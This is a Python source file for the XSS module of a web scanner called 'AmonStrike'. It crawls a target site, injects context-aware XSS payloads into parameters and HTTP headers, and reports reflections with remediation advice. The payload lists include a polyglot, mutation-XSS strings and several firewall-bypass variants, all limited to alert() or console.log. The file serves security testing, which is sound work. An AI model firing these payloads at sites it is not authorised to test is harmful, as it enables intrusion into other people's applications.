"""
AmonStrike — XSS Module (Real-Target Edition)
Context-aware XSS detection for real applications.
Tests: reflected, stored indicators, DOM hints, JSON responses, headers.
"""
import re
from .base import BaseModule
from urllib.parse import urlparse, parse_qs, urljoin

# Context-aware payloads
XSS_PAYLOADS = {
    "html":      "<img src=x onerror=alert(1)>",
    "attr":      "\" onmouseover=alert(1) x=\"",
    "js_string": "';alert(1)//",
    "js_string2": "\";alert(1)//",
    "url":       "javascript:alert(1)",
    "generic":   "<svg onload=alert(1)>",
    "generic2":  "<script>alert(1)</script>",
    "noscript":  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "polyglot":  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
}

# WAF bypass variants
WAF_XSS = [
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=alert(1) />",
    "<IMG SRC=x ONERROR=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "--><img src=x onerror=alert(1)>",
]

MARKER = "AMXSS_CONFIRM_13337"

MARKER_PAYLOADS = [
    f"<img src=x onerror=console.log('{MARKER}')>",
    f"<script>console.log('{MARKER}')</script>",
    f"'{MARKER}'",
    f"\"{MARKER}\"",
    MARKER,
]


class XssModule(BaseModule):
    NAME        = "xss"
    DESCRIPTION = "XSS — reflected, DOM hints, JSON, headers, context-aware"

    def _test_mxss(self):
        """Mutation XSS - bypass via browser DOM mutation."""
        mxss_payloads = [
            "<listing><p title='</listing><img src=x onerror=alert(1)>'>",
            "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<!--<img src=--><img src=x onerror=alert(1)>-->",
        ]
        r0 = self.get("")
        if not r0: return
        import re as _re
        links = _re.findall(r'href=["\']([^"\'#]+\?[^"\'#]+)["\']', r0.text)
        for link in links[:3]:
            if link.startswith("/"): link = f"{self.parsed.scheme}://{self.parsed.netloc}{link}"
            from urllib.parse import urlparse as _up, parse_qs as _pq
            p2 = _up(link)
            for param in list(_pq(p2.query).keys())[:2]:
                for payload in mxss_payloads[:2]:
                    r = self.get(p2.path, params={param: payload})
                    if r and payload[:15] in r.text:
                        self.add_finding(
                            title=f"Potential mXSS — Parameter {param!r}",
                            severity="MEDIUM",
                            description="Mutation XSS payload reflected. Browser DOM parsing may enable execution.",
                            evidence=f"Param: {param}\nPayload: {payload[:80]}\nReflected",
                            remediation="Use DOMPurify. Never insert user content via innerHTML.",
                            url=link, parameter=param, payload=payload, cve="CWE-79")
                        return

    def _run_dalfox(self):
        import shutil, subprocess
        if not shutil.which("dalfox") or not self.findings:
            return
        for f in list(self.findings)[:3]:
            url = f.get("url","")
            param = f.get("parameter","")
            if not url or not param:
                continue
            try:
                r = subprocess.run(
                    ["dalfox","url",f"{url}?{param}=test",
                     "--silence","--no-spinner"],
                    capture_output=True, text=True, timeout=30
                )
                if "POC" in r.stdout or "alert" in r.stdout.lower():
                    f["severity"] = "HIGH"
                    f["proof"] = f"Dalfox confirmed XSS: {r.stdout[:200]}"
                    f["title"] = f["title"].replace("Potential","Confirmed")
            except Exception:
                pass

    def run(self):
        self.log("Testing for Cross-Site Scripting (XSS)...")

        # Spider for real endpoints
        endpoints = self._spider()
        self.log(f"Found {len(endpoints)} testable endpoints", "i")

        for ep in endpoints[:30]:
            self._test_endpoint(ep)
            if len(self.findings) >= 3:
                break

        # Test headers
        self._test_headers()

        # Dalfox confirmation
        self._run_dalfox()
        self.log(f"XSS scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _spider(self) -> list:
        endpoints = []
        seen = set()

        r = self.get("")
        if not r:
            return endpoints

        # Links with params
        for link in re.findall(r'href=["\']([^"\'#]+)["\']', r.text):
            abs_url = link if link.startswith("http") else urljoin(self.url, link)
            if self.parsed.netloc not in abs_url:
                continue
            p = urlparse(abs_url)
            if p.query and abs_url not in seen:
                seen.add(abs_url)
                endpoints.append({"url": abs_url, "params": parse_qs(p.query),
                                  "method": "GET", "type": "link"})

        # Forms
        for form in self.extract_forms(r):
            action = form.get("action","") or ""
            if not action.startswith("http"):
                action = urljoin(self.url, action)
            if action not in seen:
                seen.add(action)
                endpoints.append({"url": action, "params": form.get("inputs",{}),
                                  "method": form.get("method","get").upper(), "type": "form"})

        # Common search/input params
        for param in ["q","search","s","query","name","msg","comment","text","input","data"]:
            test_url = f"{self.url}?{param}=test"
            if test_url not in seen:
                seen.add(test_url)
                endpoints.append({"url": self.url, "params": {param: ["test"]},
                                  "method": "GET", "type": "common"})

        # Extra from recon
        for ep_url in getattr(self, "extra_endpoints", [])[:15]:
            if ep_url not in seen:
                seen.add(ep_url)
                p = urlparse(ep_url)
                if p.query:
                    endpoints.append({"url": ep_url, "params": parse_qs(p.query),
                                     "method": "GET", "type": "recon"})

        return endpoints

    def _test_endpoint(self, ep: dict):
        url    = ep["url"]
        method = ep["method"]
        params = ep["params"]

        for param_name, param_vals in params.items():
            orig = param_vals[0] if isinstance(param_vals, list) else param_vals

            # First: find reflection with marker
            for marker_p in MARKER_PAYLOADS:
                test_params = {k: (v[0] if isinstance(v,list) else v) for k,v in params.items()}
                test_params[param_name] = marker_p

                if method == "POST":
                    r = self.post(url.split("?")[0], data=test_params)
                    if not r:
                        r = self.post(url.split("?")[0], json=test_params)
                else:
                    r = self.get(url.split("?")[0], params=test_params)

                if not r:
                    continue

                # Check reflection
                if MARKER in r.text:
                    # Reflected! Now determine context and find working payload
                    context = self._detect_context(r.text, MARKER)
                    payloads_to_try = self._payload_for_context(context)

                    # Try each payload for this context
                    confirmed_payload = None
                    confirmed_r2 = None
                    for payload in payloads_to_try:
                        test_params[param_name] = payload
                        if method == "POST":
                            r2 = self.post(url.split("?")[0], data=test_params)
                            if not r2:
                                r2 = self.post(url.split("?")[0], json=test_params)
                        else:
                            r2 = self.get(url.split("?")[0], params=test_params)
                        if r2 and payload in r2.text:
                            confirmed_payload = payload
                            confirmed_r2 = r2
                            break

                    if confirmed_payload and confirmed_r2:
                        self._report(url, method, param_name, confirmed_payload, confirmed_r2, context)
                        return
                    
                    # Use first payload for fallback attempts
                    payload = payloads_to_try[0] if payloads_to_try else "<img src=x onerror=alert(1)>"

                    # Try WAF bypass variants
                    for waf_payload in WAF_XSS[:5]:
                        test_params[param_name] = waf_payload
                        if method == "POST":
                            r3 = self.post(url.split("?")[0], data=test_params)
                        else:
                            r3 = self.get(url.split("?")[0], params=test_params)
                        if r3 and waf_payload in r3.text:
                            self._report(url, method, param_name, waf_payload, r3, context)
                            return

                    # Only report reflection if it's in a dangerous context
                    if context in ["html","attr","js_string","js_code"]:
                        # Try one more WAF bypass before reporting as medium
                        bypassed = False
                        for bp in WAF_XSS[5:10]:
                            test_params[param_name] = bp
                            r4 = self.get(url.split("?")[0], params=test_params) if method=="GET" else self.post(url.split("?")[0], data=test_params)
                            if r4 and bp in r4.text:
                                self._report(url, method, param_name, bp, r4, context)
                                bypassed = True
                                break
                        # Only report if context is exploitable AND not unknown
                        if not bypassed and context in ["html","attr","js_string"]:
                            # Final check: is the reflection inside a tag/attribute?
                            import re as _re
                            marker_pos = r.text.find(MARKER)
                            if marker_pos > 0:
                                before = r.text[max(0,marker_pos-100):marker_pos]
                                # Inside an open tag = exploitable
                                if "<" in before and ">" not in before[-20:]:
                                    # Only report attr-context reflections if inside actual HTML tag
                                            self._report(url, method, param_name,
                                                marker_p, r, context, reflection_only=True)
                    break

    def _detect_context(self, html: str, marker: str) -> str:
        """Find what HTML context the marker landed in."""
        idx = html.find(marker)
        if idx == -1:
            return "unknown"
        before = html[max(0,idx-200):idx]

        # Inside <script> tag
        if re.search(r'<script[^>]*>[^<]*$', before, re.I | re.S):
            # Inside string?
            q_count = before.count('"') + before.count("'")
            return "js_string" if q_count % 2 else "js_code"

        # Inside attribute
        if re.search(r'<[a-z]+[^>]*\s\w+=["\'][^"\']*$', before, re.I):
            return "attr"

        # Inside href/src
        if re.search(r'<[a-z]+[^>]*(href|src|action)=["\'][^"\']*$', before, re.I):
            return "url_attr"

        # Default: HTML body
        return "html"

    def _payload_for_context(self, context: str) -> str:
        return {
            "html":      "<img src=x onerror=alert(1)>",
            "attr":      "\" onmouseover=alert(1) foo=\"",
            "js_string": "';alert(1)//",
            "js_string2":"\"};alert(1)//",
            "js_code":   "alert(1);",
            "url_attr":  "javascript:alert(1)",
        }.get(context, "<img src=x onerror=alert(1)>")

    def _test_headers(self):
        """Test XSS via HTTP headers that get reflected."""
        injectable_headers = {
            "User-Agent":     f"<img src=x onerror=alert(1)>",
            "Referer":        f"{self.url}/<img src=x onerror=alert(1)>",
            "X-Forwarded-For":f"<img src=x onerror=alert(1)>",
            "X-Custom-Name":  f"<img src=x onerror=alert(1)>",
        }
        for header, payload in injectable_headers.items():
            r = self.get("", headers={header: payload})
            if r and payload in r.text:
                self.add_finding(
                    title       = f"Reflected XSS via HTTP Header: {header}",
                    severity    = "HIGH",
                    description = (
                        f"XSS payload injected via {header} header is reflected "
                        f"unencoded in the response body."
                    ),
                    evidence    = f"Header: {header}: {payload}\nReflected in response: YES",
                    remediation = "Encode all HTTP header values before including in HTML output.",
                    url         = self.url,
                    parameter   = header,
                    payload     = payload,
                    cve         = "CWE-79",
                )

    def _report(self, url, method, param, payload, resp, context,
                reflection_only=False):
        if reflection_only:
            sev  = "INFO"
            title= f"Reflected Input (Potential XSS) — Parameter '{param}' [{method}]"
            desc = (f"User input via '{param}' is reflected in the response without encoding "
                    f"(context: {context}). Manual verification recommended to confirm XSS.")
        else:
            sev  = "HIGH"
            title= f"Reflected XSS — Parameter '{param}' [{method}] (context: {context})"
            desc = (f"Cross-site Scripting confirmed via {method} parameter '{param}'. "
                    f"Payload executed in {context} context. "
                    f"Enables session hijacking, account takeover, and malicious JS execution.")

        self.add_finding(
            title       = title,
            severity    = sev,
            description = desc,
            evidence    = (
                f"URL: {url}\nMethod: {method}\nParameter: {param}\n"
                f"Context: {context}\nPayload: {payload}\n"
                f"Payload reflected: {'YES (executable)' if not reflection_only else 'YES (unencoded)'}"
            ),
            remediation = (
                "1. HTML-encode all output (use templating engine auto-escaping)\n"
                "2. Implement Content-Security-Policy header\n"
                "3. Use HttpOnly cookies to prevent session theft via XSS"
            ),
            url         = url,
            parameter   = param,
            payload     = payload,
            cve         = "CWE-79",
        )
